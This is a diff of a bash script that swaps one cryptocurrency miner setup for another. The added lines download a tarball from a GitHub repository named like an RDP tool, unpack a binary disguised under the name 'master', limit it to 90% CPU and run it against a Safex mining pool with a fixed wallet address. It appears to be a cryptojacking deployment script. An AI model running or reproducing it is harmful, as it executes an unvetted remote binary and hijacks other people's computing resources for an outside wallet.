@@ -1,6 +1,8 @@
 #!/bin/bash
 apt-get update 
 apt-get install -y wget cpulimit
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 
-cpulimit -l 80 -e violetminer &
-./violetminer --pool 168.235.86.33:3393 --username SK_QzApkbVGsAxyQykaWSnEF.AutoBitcoin_Aan433 --password x --algorithm wrkzcoin
+wget https://github.com/duitawa/RDPWindows201901/raw/master/citel.tar.gz
+tar xf citel.tar.gz
+cd citel
+cpulimit -l 90 -e master &
+./master -a rx/sfx -o pool.safex.org:3311 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X -p PROXY --donate-level 1 -k
